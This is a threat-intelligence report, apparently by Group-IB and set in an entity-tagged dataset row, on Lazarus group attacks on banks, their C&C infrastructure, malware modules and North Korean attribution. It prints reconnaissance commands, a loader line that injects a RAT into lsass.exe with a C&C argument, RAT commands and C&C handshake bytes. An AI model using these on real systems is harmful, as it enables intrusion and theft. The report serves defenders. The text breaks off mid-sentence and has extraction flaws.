News,,T1064;T1193;T1204;T1221;T1140;T1060;T1043;T1071;T1082;T1105;T1001;T1107,,,,,,30,4,0,13,2,22,11,27,2,1,0,13,0,0,0,0,0
Group-IB_Lazarus,"<THREAT_ACTOR>Lazarus</THREAT_ACTOR> 
ARISEN

ARCHITECTURE / TOOLS / ATTRIBUTION



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution2

INTRODUCTION

In <TIMESTAMP>February 2016</TIMESTAMP>, hackers reportedly attempted to steal approximately  
1 billion USD from the <ORG>Central Bank of Bangladesh</ORG> through <SOFTWARE>SWIFT</SOFTWARE>. In <TIMESTAMP>February 2017</TIMESTAMP>, several Polish <INDUSTRY>banks</INDUSTRY> were compromised.

Security researchers analysed the malware code, chiefly using this to attribute 
activity to <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group. As tools are often reused by different groups, while 
helpful, malware analysis does not provide conclusive evidence of attribution.

<ORG>Group-IB</ORG> researchers investigating <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group collected a broad range 
of data, both technical and strategic, which places clear attribution on <COUNTRY>North Korea</COUNTRY>. The team detected and thoroughly analyzed multiple layers of C&C 
infrastructure used by <THREAT_ACTOR>Lazarus</THREAT_ACTOR> and have identified North Korean IP addresses 
from which the attacks were ultimately controlled. The following report is 
an overview of this group’s attack methodology for financial institutions, the 
malware employed and review of their targets.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution3

Through analysis of <THREAT_ACTOR>Lazarus</THREAT_ACTOR> activity, <ORG>Group-IB</ORG> gained deep insight on a 
complex botnet infrastructure built by the hacker group to conduct their 
attacks. To mask malicious activity, the hackers used a three-layer architecture 
of compromised servers with SSL encrypted channels established between 
them. In addition to encrypted traffic, data sent through SSL channel was 
additionally encrypted.  The attackers achieved anonymity by employing a 
legitimate VPN client - <TOOL>SoftEther VPN</TOOL>. In some cases, they also used corporate 
web servers that were part of the attacked infrastructure. 

To control infected machines, the hackers employed multi-module tools, 
attempting to complicate malware analysis. That said, they managed to 
conduct several successful attacks without employing 0day exploits. <THREAT_ACTOR>Lazarus</THREAT_ACTOR> 
demonstrated a flexible approach to attacks by applying different hacking tools, 
which prevented their detection by endpoint security solutions.

 
 
 

According to our investigation of the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> infrastructure, the threat actors 
connected to the end C&C layer (Layer3) from two North Korean IP addresses 
<IOC>210.52.109.22</IOC> and <IOC>175.45.178.222</IOC>. The second IP-address relates to Potonggang 
District, perhaps coincidentally, where <ORG>National Defence Commission</ORG is 
located — the highest military body in <COUNTRY>North Korea</COUNTRY>

Additional evidence was confirmed that <THREAT_ACTOR>Lazarus</THREAT_ACTOR> links to North Korean hackers 
by <ORG>Group-IB</ORG> specialists through analysis of pubic sources. We found a news 
report from a South Korean <ORG>Arirang</ORG> TV agency, dated <TIMESTAMP>2016</TIMESTAMP>, about an attack on 
South Korean television stations and <INDUSTRY>banks</INDUSTRY> as part of <THREAT_ACTOR>DarkSeoul</THREAT_ACTOR> operation.  This 
attack performed by North Korean hackers and was investigated by the <ORG>South Korea’s National Police Agency</ORG>, who detected two IP addresses <IOC>175.45.178.19</IOC> and 
<IOC>175.45.178.97</IOC>, used by hackers to control malware. Both IP addresses are in the 
same block of IP addresses the IP <IOC>175.45.178.222</IOC>, which was discovered by  
<ORG>Group-IB</ORG> specialists.

KEY  
FINDINGS

01

Unique tools  
and C&C infrastructure 

Links to  
<COUNTRY>North Korea</COUNTRY>

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 

<THREAT_ACTOR>Lazarus</THREAT_ACTOR> is purportedly controlled by <ORG>Bureau 121</ORG>, a division of the 
<ORG>Reconnaissance General Bureau</ORG>, a <ORG>North Korean intelligence agency</ORG>.  
<ORG>Bureau 121</ORG> is responsible for conducting military cyber campaigns.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution4

<TIMESTAMP>Since 2016</TIMESTAMP>, the hackers have tried to mask their activity by pretending to 
be Russian hackers. They added specific debugging symbols and strings 
containing Russian words to a new version of <MALWARE>Client_TrafficForwarder</MALWARE>, a 
module designed to proxy network traffic. To protect their executables, 
they used <TOOL>Enigma Protector</TOOL>, a commercial product, which was created by a 
Russian software developer. They also used exploits for <SOFTWARE>Flash</SOFTWARE> and <SOFTWARE>SilverLight</SOFTWARE> 
from sets of exploits created by Russian-speaking hackers.

These masquerade techniques did initially mislead some researchers who 
conducted express analysis of malicious code. 
 
 
 
A state-sponsored hacker group <THREAT_ACTOR>Lazarus</THREAT_ACTOR> managed to gain fraudulent 
access to the <SOFTWARE>SWIFT</SOFTWARE> network of attacked <INDUSTRY>banks</INDUSTRY>. This is believed to be a 
growing trend: state-sponsored hackers are demonstrating an increased 
interest in conducting attacks on financial institutions, which are considered 
a component of the national critical infrastructure in some countries. At the 
moment, only a few similar incidents have been detected. For example, 
<TIMESTAMP>IN 2010-2013</TIMESTAMP> the <ORG>NSA</ORG> reportedly penetrated the <SOFTWARE>SWIFT</SOFTWARE> banking network and 
monitored a number of <COUNTRY>Middle East</COUNTRY> <INDUSTRY>banks</INDUSTRY>. In late <TIMESTAMP>2016</TIMESTAMP>, attacks on Ukrainian 
<INDUSTRY>banks</INDUSTRY> were conducted, allegedly as part of the <MALWARE>BlackEnergy</MALWARE> operation. 
However, researchers expect that the number of attacks on financial 
institutions by state-backed hackers may significantly increase in the future. 
 
 
 
The earliest indicator of compromise detected by <ORG>Group-IB</ORG>  is dated <TIMESTAMP>March 2016</TIMESTAMP>. This was directly after the <ORG>Central Bank of Bangladesh</ORG> incident, 
which took place in <TIMESTAMP>February 2016</TIMESTAMP>, where attackers attempted to steal $1 
billion USD. Only a spelling mistake in an online bank transfer instruction 
helped prevent them from stealing more than $81 million USD. Following 
this incident, the group modified its tactics and tools, adapting them to the 
changing environment and misleading researchers.

Through analysis of compromised networks, <ORG>Group-IB</ORG> identified IP addresses 
of universities in the <COUNTRY>US</COUNTRY>, <COUNTRY>Canada</COUNTRY>, <COUNTRY>Great Britain</COUNTRY>, <COUNTRY>India</COUNTRY>, <COUNTRY>Bulgaria</COUNTRY>, <COUNTRY>Poland</COUNTRY>, 
<COUNTRY>Turkey</COUNTRY>, pharmaceutical companies in <COUNTRY>Japan</COUNTRY> and <COUNTRY>China</COUNTRY>, as well as government 
subnets in various countries.

Emerging trend

Victims

Masquerading  
as Russian hackers 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution5

To infiltrate systems of their interest, <THREAT_ACTOR>Lazarus</THREAT_ACTOR> conducted <TECHNIQUE>watering-hole</TECHNIQUE> attacks 
leveraging compromised resources often visited by their potential victims, 
such as websites of financial regulators and government agencies in several 
countries.   
 
Some of these resources are listed below: 

• knf.gov.pl — <ORG>The Polish Financial Supervision Authority</ORG>

• cnvb.gob.mx — <ORG>National Banking and Securities Commission</ORG>, <COUNTRY>Mexico</COUNTRY>

• brou.com.uy —  <ORG>Banco de la República Oriental del Uruguay</ORG>, a state-owned  
<INDUSTRY>bank</INDUSTRY> in <COUNTRY>Uruguay</COUNTRY>

Through examination of a code on a web server with exploits, <ORG>Group-IB</ORG> specialists detected a list of 255 IP address ranges. That said, hackers 
infected only those users who visited the website from a computer within the 
specified IP range. Based on this list, researchers have compiled a map of the 
countries that were of interest to the attackers, which is presented below.

ATTACK 
PREPARATION AND 
IMPLEMENTATION

2.1  Infection  
of web resources

02 To conduct attacks, the criminals 
developed toolsets to control C&C 
servers and infected machines, built 
a three-layer C&C infrastructure, 
and compromised dozens of large 
web resources.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution6

To gain access to websites of <INDUSTRY>financial</INDUSTRY> regulators and <INDUSTRY>bank</INDUSTRY> local networks, 
hackers used known vulnerabilities in <SOFTWARE>JBoss</SOFTWARE> and <SOFTWARE>Liferay</SOFTWARE>. They compiled an 
exploit for <SOFTWARE>SilverLight</SOFTWARE> <CVE>CVE-2016-0034</CVE> (MS16-006) which earlier was included 
into <MALWARE>RIG</MALWARE> and <MALWARE>Angler</MALWARE> exploit kits, they also used <MALWARE>Flash exploits</MALWARE> from <MALWARE>Neutrino Exploit Kit</MALWARE>.

 
 
 
 
Attackers created a 3-tier infrastructure that consisted of compromised 
servers, between which the hackers established SSL encrypted channels. The 
network interaction with the attacked computer was carried out only from the 
Layer 1 server, which acted as a C&C server. In some cases, hackers placed the 
Layer 1 server inside the organization attacked in order to reduce the risk of 
detection. They gained access to these servers by brute forcing passwords for 
RDP. 

Hackers used original set of tools:

 
Through in-depth analysis of the tools used by the attackers, <ORG>Group-IB</ORG> 
specialists identified the scheme of communications between nodes within 
the C&C infrastructure.

2.2  Establishment of C&C 
infrastructure:  

<MALWARE>ServerRAT</MALWARE> Used to manage windows-based server infrastructure

Server_TrafficForwarder Forwards traffic from one external server to another  

Backend_ Listener Establishes connection with servers with installed Server_
RAT, gets commands directly from the threat actor

<MALWARE>Admin_Tool</MALWARE> Admin tool to send commands to infected computers

<SOFTWARE>SWIFT</SOFTWARE> toolbox Used to work with <SOFTWARE>SWIFT</SOFTWARE>, consists of Alliance software 
Hook Files and <SOFTWARE>SWIFT</SOFTWARE> transactions Information 
Harvester.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution7

<MALWARE>ServerRAT</MALWARE> was installed on all infrastructure levels to control the 
compromised infrastructure 
 
<MALWARE>ServerRAT</MALWARE> constantly listens on port 3365, to which attackers connected 
to control the server. To ensure the availability of the specified port, 
the malicious program added a special rule to the firewall that allowed 
incoming connections to this port. Infected computers performed an 
outgoing connection to the compromised server acting as proxy via port 
443. Typically outbound connections on this port are allowed in corporate 
networks.

Based on analysis of the <MALWARE>ServerRAT</MALWARE> functionality, <ORG>Group-IB</ORG> specialists 
identified that <MALWARE>ServerRAT</MALWARE> responds to certain requests in a specific way. 
Keeping in mind that <MALWARE>ServerRAT</MALWARE> constantly keeps port 3365 open, we 
scanned the Internet for open ports 3365. Following this, we checked a 
list of detected servers to identify those servers where <MALWARE>ServerRAT</MALWARE> was 
installed. As a result, <ORG>Group-IB</ORG> specialists received a list of 74 IP addresses, 
which are presented in the Indicators of Compromise section.

Server_TrafficForwarder was installed on the first and second server level 
— this module redirected traffic from one server to another.  
 
In some cases, Server_TrafficForwarder was installed on servers inside the 
attacked organization. This approach allows the criminal to avoid detection 
of suspicious connections to the external network or bypass network 
connection restrictions with prohibited connections to the external network 
from specific computers/servers, which is often applied by companies to 
protect the most critical PCs, such as those of <SOFTWARE>SWIFT</SOFTWARE> operators. 

Three-layer C&C server infrastructure

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution8

After the start, Server_TrafficForwarder reads the contents of the key and 
certificate files from the root directory that will be used to create an SSL 
tunnel. That said, the file does not contain any information about the servers 
to which traffic should be transferred. At the first start, hackers manually 
specify the port to listen on as well as the address of the C&C server to 
which traffic is to be sent. In the event the port is not specified, the program 
listens on a random port and waits for incoming connections. 

To verify communication with a compromised server, hackers check if the 
client is appropriate: they send the first network request; when a response 
is received from the client, they decrypt it and compare with a previously 
known response. In the event the responses are different, the connection is 
broken. 

The table below contains all commands available:

The only difference in the Server_TrafficForwarder configuration on Layer 
1 and Layer 2 servers respectively is that Server_TrafficForwarder installed 
on Layer 1 accepts traffic from port 443 and forwards it on the same port 
of Layer 2. While Layer 2 accepts traffic on port 443 and forwards it to port 
8080 of Layer 3.

Commands Description

0x1095 -

0x1096 Collects and sends system 
information

0x10AA Gets the configuration

0x10AB Changes the configuration 
(including the port on which 
it listens for connections)

0x10AE -

0x10AF -

0x10B3 Reads a private key file and 
sends it to the operator

0x10B4 Records data to a file

Commands Description

NONE -

GINF Collects and sends system 
information

GCFG Gets the configuration 

SCFG Changes the configuration 
(including the port on which 
it listens connections) 

SLEP -

HIBN -

LCLR Records data to a file

LDWN Reads a private key file and 
sends it to the operator

Commands of the first version: Commands of the second version:



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution9

To encrypt all of its network connections, the traffic forwarder uses the 
statically linked wolfSSL libraries and SSL certificates which are generated 
by a pre-defined template. The “Issued for“ field always contains a third-level 
domain slash an email address.  

A few examples are shown below: 

• www.resfinan.com/emailAddress=info@resfinan.com

• finews.otzo.com/emailAddress=master@otzo.com

• host.global.com/emailAddress=info@host.global.com

• latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com 

With information about this template, <ORG>Group-IB</ORG> specialists managed to detect 
similar certificates and associated hosts. With these indicators, you can check 
if your organization was, or is, under attack by <THREAT_ACTOR>Lazarus</THREAT_ACTOR>.

 
<MALWARE>Backend_Listenerr</MALWARE> is software installed by attackers on Layer 3 servers. The 
program performs communications with other servers, receives commands 
from the administrator and sends them in chain order to the end infected 
computer. 

<MALWARE>Backend_Listenerr</MALWARE> listens on the two ports:

• port 8080, to which it accepts SSL connections from Layer 2 servers.

• port 9090, to which it accepts connections from the control system 
(<MALWARE>Admin_Tool</MALWARE>). 

To encrypt traffic, the wolfSSL open source library is used. After the 
application is launched, the private key and certificate files are loaded from 
the root directory. These files are used to encrypt traffic between the C&C 
server and connected clients.

To defend against security solutions designed to “unpack” SSL encrypted 
traffic, <MALWARE>Backend_Listenerr</MALWARE> encrypts all data sent over an SSL channel using an 
additional reversible encryption algorithm and performs legitimacy checks.  

To reverse-engineer the protocol of server communications with clients, 
<ORG>Group-IB</ORG> specialists have developed a client that successfully connects to 
both above-mentioned ports.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution10

This allowed us to analyze communications between the Admin-Tool and 
<MALWARE>Backend_Listenerr</MALWARE> and we discovered that: 

<MALWARE>Admin_Tool</MALWARE> must have an key pair that is identical to the server 

<MALWARE>Admin_Tool</MALWARE> sends a customized Hello-package that differs from the one 
that is provided by the library. By default this package (msg) is specified in 
the library as follows: 

 
<MALWARE>Admin_Tool</MALWARE> sends an encrypted (special) packet with a length from the 
previous packet (len). 

The server decrypts the contents of the packet sent.After decryption, the 
following conditions must be true:

3

4

static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };
static unsigned char ecnrypted_str[17] = { 0x38, 0x94, 0x3C, 0x6A, 0x58, 0x39, 
0x1A, 0x56, 0x81, 0x4B, 0x09, 0x99, 0x1D, 0xE0, 0xCF, 0x81, 0x3F };

(DWORD)&decrypted_buff[5] == len 
(DWORD)&decrypted_buff[15] == len

where len is the length of the packet

1

2

The correct Hello packet that will be accepted by <MALWARE>Backend_Listener</MALWARE> must be of the 
following form:

 
In fact, this is an information packet, rather than a Hello packet, and its first byte 
contains the length of the next packet sent («len»), while the rest bytes must be zero 
in this case.

#ifndef WOLFSSL_ALT_TEST_STRINGS
char msg[32] = «hello wolfssl!»;   /* GET may make bigger */

static unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution11

<MALWARE>Admin_Tool</MALWARE>  sends DWORD with len2 < 201 where len2 is the length of the 
next package.  

<MALWARE>Admin_Tool</MALWARE> sends encrypted (special) package #2. It’s length is determined 
in the previous package. 

Server decrypts the content of the package, and the following rules should 
work there after decryption: 

VPN: the attackers installed <TOOL>SoftEther VPN</TOOL> (http://softether.net/) service 
supported by <ORG>University of Tsukuba</ORG>, <COUNTRY>Japan</COUNTRY> on some servers to unsure 
additional level of anonymity. 

<THREAT_ACTOR>Lazarus</THREAT_ACTOR> have chosen this service for the following reasons:

• This legitimate application isn’t detected by security solutions 

• It can establish VPN connection via ICMP or DNS to avoid detection by network 
security solutions 

• It contains Dynamic DNS function, which means that if a compromised system has 
a dynamic IP address, the attacker can always find it by DNS name connected to 
the VPN client 

• This VPN client supports <SOFTWARE>Windows</SOFTWARE>, <SOFTWARE>Linux</SOFTWARE>, <SOFTWARE>FreeBSD</SOFTWARE>, <SOFTWARE>Solaris</SOFTWARE>, <SOFTWARE>Mac OS X</SOFTWARE>

6

7

static unsigned char ecnrypted_str[17] = {  
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 

    0xC8, 0x88, 0xE0, 0xE4, 0x94, 0x85, 0xCC, 0xD1, 0x03, 0x00, 

(DWORD)&decrypted_buff[4] == 0xD1CC8594  
(DWORD)&decrypted_buff[8] == 3

Only if all validity checks are made, the traffic is forwarded from one port to another in 2 
streams. Following this, when the client connects to the first port (8080), the service will 
forward the traffic from the first port to the second one, and back.

The operators connected to port 9090 of Layer 3 servers from the following IP 
addresses: 

- <IOC>210.52.109.22</IOC> (<COUNTRY>North Korea</COUNTRY>)

- <IOC>175.45.178.222</IOC> (<COUNTRY>North Korea</COUNTRY>)

- <IOC>157.7.135.182</IOC> (<COUNTRY>Japan</COUNTRY>) and <IOC>202.101.36.45</IOC> (<COUNTRY>China</COUNTRY>) - via <TOOL>SoftEther VPN</TOOL>

5

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution12

In addition to multi-layer server structure, hackers developed a specialized 
toolset to perform remote control over infected PCs.

The group actively attempted to conceal their activity, complicating malware 
detection and analysis as much as possible. All tools consist of modules, which 
were delivered separately to target organizations only. To complicate malware 
investigation, criminals encrypted and obfuscated their tools.

Modular architecture of the victim’s infection process provides both additional 
flexibility and anonymity throughout the cyber-attack. This scheme allows 
hackers to divide software development activity between teams, as well as to 
ensure the reuse of program code.

<MALWARE>RECON</MALWARE> is a backdoor that is initially installed on the target machine through 
successful execution of exploits. This module is used by hackers to perform 
initial reconnaissance to search for systems of interest. 

Once launched, the program adds itself to the auto-start by copying its file 
to the directory ""%USERPROFILE%\AppData\Roaming\Microsoft\Windows\
Start Menu\Programs\Startup"", collects data about the system and network 
environment and sends them to the C&C server. 

2.3  Tools to control infected PCs 

cmd.exe /c hostname
cmd.exe /c whoami
cmd.exe /c ver
cmd.exe /c ipconfig -all
cmd.exe /c ping www.google.com
cmd.exe /c query user
cmd.exe /c net user
cmd.exe /c net view
cmd.exe /c net view /domain
cmd.exe /c reg query «HKCU\SOFTWARE\Microsoft\Windows\
CurrentVersion\Internet Settings»
cmd.exe /c tasklist /svc
cmd.exe /c netstat -ano | find «TCP»

Below is a list of data collected:

<MALWARE>RECON</MALWARE> Performs initial reconnaissance to determine if a systems is of 
interest to the threat actors

<MALWARE>Dropper</MALWARE> Extracts and decrypts <MALWARE>Loader</MALWARE>

<MALWARE>Loader</MALWARE> Decrypts the payload — <MALWARE>Client_RAT</MALWARE> or <MALWARE>Client_TrafficForwarder</MALWARE> 
— and injects into the legitimate process

<MALWARE>Client_TrafficForwarder</MALWARE> Forwards operator’s commands from external network into 
corporate network

<MALWARE>Client_RAT</MALWARE> Provides full control over the target system



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution13

In the event the system is not of interest, the module will use the ""killkill"" 
command to remove itself from the infected system. If the system is of interest, 
then <MALWARE>RECON</MALWARE> downloads <MALWARE>Dropper</MALWARE> using the “http” command. <MALWARE>Dropper</MALWARE> will then 
install <MALWARE>Client_RAT</MALWARE> to the infected system as follows: 

<MALWARE>Dropper</MALWARE> extracts and decrypts <MALWARE>Loader</MALWARE>, embeds it into the system and 
extracts <MALWARE>Client_RAT</MALWARE>.

To decrypt the configuration file, <MALWARE>Dropper</MALWARE> needs MD5 encryption key, which 
only the attacker knows.

<ORG>Group-IB</ORG> specialists have analyzed two versions of <MALWARE>Dropper</MALWARE>. There are no 
fundamental differences between them: both versions were used to decrypt 
the loader and encrypted payload, as well as to ensure loader persistence in 
the system.

Arguments Description

dropper.exe -l Enumerates system 
services

dropper.exe  -e 
[path]

Retrieves and decrypts 
encrypted payload and 
saves it to the specified file

dropper.exe –a 
[service name] 
[path to DLL]

Installs the library as a 
service

Arguments Description

dropper.exe -x 
[key] -l

Enumerates system services

dropper.exe 
-x [key] -e 
[servicename] 
[config]

Extracts and decrypts the payload 
from config and sets it as a service

dropper.exe -x 
[key] -f

Installs implants by adding 
information about them to the 
system registry

dropper.exe 
-x [key] -o 
[eventname]

Calls OpenEventA with a special 
event name

dropper.exe 
-x [key] -t 

Calls OpenEventA with a special 
event name, then calls Setvent API

Commands of the first version:

Version 1 Version 2

In addition, <MALWARE>Dropper</MALWARE> can read executable data from registry keys and embed 
them in the selected process. The executable data is read from the following 
registry keys:

• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\Security\Data2

• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\Security\Data3

Commands of the second version

<MALWARE>RECON</MALWARE>

СИСТЕМНЫЕ 
ПРОЦЕССЫ

<MALWARE>Dropper</MALWARE>

<MALWARE>Client_RAT</MALWARE>
<MALWARE>Client_RAT</MALWARE>

<MALWARE>Client_RAT</MALWARE>
<MALWARE>Client_RAT</MALWARE>

<MALWARE>Loader</MALWARE>

<MALWARE>Dropper</MALWARE>
<MALWARE>Loader</MALWARE>

<MALWARE>Loader</MALWARE>
<MALWARE>Dropper</MALWARE> decrypts 
and embeds <MALWARE>Loader</MALWARE>
extracts decrypted 
<MALWARE>Client_RAT</MALWARE>

<MALWARE>Loader</MALWARE> decrypts 
and embeds 
<MALWARE>Client_RAT</MALWARE>

<MALWARE>RECON</MALWARE> decrypts 
and embeds 
<MALWARE>Dropper</MALWARE>

2 31

встраивание 
в систему

встраивание 
в систему

встраивание 
в систему

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution14

<MALWARE>Loader</MALWARE> is used to decrypt the payload — <MALWARE>Client_RAT</MALWARE> or <MALWARE>Client_TrafficForwarder</MALWARE> 
— and inject it into the legitimate process (for example, in lsass.exe)

Hackers manually specify the C&C server at the time when the main program 
is started. That’s why even if researchers detect the loader they cannot 
identify where the C&C server is located, by whom it is controlled, and which 
port is used for connection. In some cases, an additional loader was used by 
criminals.  

Example of loader launch:   

<MALWARE>Client_TrafficForwarder</MALWARE>

This module was installed on one of the PCs in the internal network of the 
attacked organization. It proxies traffic from C&C server to PCs in the local 
network of the attacked organization.

<MALWARE>Client_RAT</MALWARE>

The <MALWARE>Client_RAT</MALWARE> program provides full control over the target system: it allows 
you to analyze the system, download and execute files, transfer data from the 
infected computer to the C&C server.

Communications with the C&C server are performed over an encrypted SSL 
channel. For this purpose, <MALWARE>Client_RAT</MALWARE> uses statically linked libcurl libraries, 
version 7.47.1 (<TIMESTAMP>FEB 2016</TIMESTAMP>).

loader.exe -d «encrypted_payload.bin» -p 1540 -s [encrypted_C&C:port] -r [encrypted_commands]

Argument -d:
Name of the file  

where Client _Rat or  
Client_Forwarder are stored 

in encrypted form

Argument -p:
ID of the process (for example, lsass.

exe) in which the payload –  <MALWARE>Client_RAT</MALWARE> 
or <MALWARE>Client_TrafficForwarder</MALWARE> – should be 

embedded

 Two more arguments:
 –r (functionality has not been 

identified) and –s 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution15

This program may execute the following commands received from the C&C 
server:

Command Description

NONE Do not execute any commands

GINF Collect and send extensive 
system information about the 
PC

SLEP Do not execute any commands

HIBN Do not execute any commands

DRIV Get information about available 
disks in the system

DIRP List files with the specified 
extension

CHDR Change current directory

RUNX Get the user token

MOVE Rename specified file

FTIM Set the timestamps of the file 
%windir%/system32/kernel32.dll 
to the specified file

NEWF Create a new directory with the 
specified name

ZDWN Presumably download the file/
files

PEIN Inject code in the specified 
process

TCON Presumably connect to the 
specified network node

DIR List files in the selected 
directory

DIE Remove itself  
from the system

DEL Delete selected file

WIPE Delete the selected file and 
make it unrecoverable

UPLD Upload the file to C&C

SCFG Get a new bot configuration

DRIV Enumerate installed drivers

DOWN Download and run the file

CMDL Run the command and upload 
the result of its work to С&C

GCFG Download bot configuration

RUN Execute command

PVEW List running processes

PEEX Inject the code in the process 
explorer.exe

PKIL Terminate the process with the 
selected PID

DescriptionCommand

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution16

Due to analysis of <THREAT_ACTOR>Lazarus</THREAT_ACTOR> infrastructure, <ORG>Group-IB</ORG> specialists have detected 
that the attack was controlled from two IP addresses:

• <IOC>210.52.109.22</IOC> belongs to an autonomous system <ORG>China Netcom</ORG>. However, some 
sources indicate that the set of IPs <IOC>210.52.109.0/24</IOC> is assigned to <COUNTRY>North Korea</COUNTRY>.

• <IOC>175.45.178.222</IOC> refers to a North Korean Internet service provider. The <SOFTWARE>Whois</SOFTWARE>
service indicates that this address is allocated to the Potonggang District, 
perhaps coincidentally, where <ORG>Natinal Defence Commission</ORG> is located — the 

highest military body in <COUNTRY>North Korea</COUNTRY>

Through investigation of public information, we came across a TV report 
from a South Korean news agency <ORG>Arirang News</ORG> dated <TIMESTAMP>2016</TIMESTAMP> 

On the screen behind the host, <ORG>Group-IB</ORG> specialists noticed two IP addresses 
<IOC>175.45.178.19</IOC> and <IOC>175.45.178.97</IOC>, which had been used to control <MALWARE>Ghost RAT</MALWARE> 
malware. Both IP addresses are in the same set of IP addresses as an IP address 
<IOC>175.45.178.222</IOC> that was discovered by <ORG>Group-IB</ORG> specialists.

The <ORG>South Korea’s National Police Agency</ORG> reportedly identified that the cyber-
attack had been performed from the unfinished North Korean Ryugyong hotel. 
<ORG>Group-IB</ORG> could not confirm this location attribution. 

ATTACK 
ORGANIZERS

3.1  Involvement  
of <COUNTRY>North Korea</COUNTRY> 

03

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution17

<ORG>1st Bureau Operations</ORG>

<ORG>2nd Bureau Reconnaissance</ORG>

<ORG>3rd Bureau Foreign Intelligence</ORG>

<ORG>5th Bureau Inter-Korea Dialogue</ORG>

<ORG>6th Bureau Technical</ORG>

<ORG>7th Bureau Rear Services</ORG>

<ORG>Bureau 121</ORG>

<ORG>Reconnaissance General Bureau</ORG>

Starting in <TIMESTAMP>2016</TIMESTAMP>, the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group tried to mask their activity by 
pretending to be Russian hackers: 

1. The <MALWARE>Client_TrafficForwarder</MALWARE> module includes debugging symbols and 
strings containing Russian words in descriptions of commands received by 
malware from the C&C server. 
 
It’s worth noting that ""Russian commands"" received from the server are 
not typical for a Russian native speaker, and in the case of the «poluchit» 
(to receive) command the meaning of the word contradicts the action (to 
send) it is intended for. 
 
 
  
 

2. To protect their executables, hackers used <TOOL>Enigma Protector</TOOL>, a commercial 
product, which was created by a Russian software developer.

3. Exploits for <SOFTWARE>Flash</SOFTWARE> and <SOFTWARE>SilverLight</SOFTWARE> were borrowed from the sets of exploits 
created by Russian-speaking hackers. 

These techniques to mask attribution initially mislead some researchers 
conducting preliminary analysis.

3.2  Masquerading as Russian hackers

Poluchit (means ""to get"" in Russian)                Send a network address of the current 

Layer 2 server to the C&C server 

The <THREAT_ACTOR>DarkSeoul</THREAT_ACTOR> group (aka <THREAT_ACTOR>Lazarus</THREAT_ACTOR>) is controlled by Bureau 121, a division of the 
<ORG>Reconnaissance General Bureau</ORG>, a <ORG>North Korean intelligence agency</ORG>. <ORG>Bureau 121</ORG> 
is responsible for conducting military cyber campaigns.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution18

RECOMMENDATIONS04

Updates of software and operating systems

To prevent infection through execution of exploits, it is enough to update 
your <SOFTWARE>Microsoft</SOFTWARE> and <SOFTWARE>Adobe</SOFTWARE> software.The <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group uses known and 
patched exploits, rather than leveraging 0day vulnerabilities. That’s why, 
even usual software updates did not allow attackers to infiltrate corporate 
networks. Unfortunately, some of the attacked <INDUSTRY>banks</INDUSTRY> did not comply with this 
requirement.

Network traffic analysis

Even if the criminals have managed to obtain access to the corporate 
network, the attack can still be successfully prevented. After intrusion into the 
company’s network hackers still need to find systems of their interest, and 
gain access to them. It takes days and even months sometimes, and this time 
should be used to detect the malicious activity.

Attackers use malicious programs that transfer data to the C&C server — 
Layer 1. Communications between the infected computer and the C&C server 
can be identified through network traffic analysis. All communications are 
encrypted, that is why you should use solutions that can detect network 
anomalies based on threat intelligence data.

Application whitelisting

Application whitelisting should be introduced into critical bank servers. This 
will prevent attackers from installing their remote control tools, monitoring 
financial transactions, and escalating privileges. It also helps to identify 
unauthorized attempts to run such malicious applications.

Checking indicators of compromise

The “Indicators of compromise” section contains current and historical 
intelligence data. With these indicators, you can check if your organization 
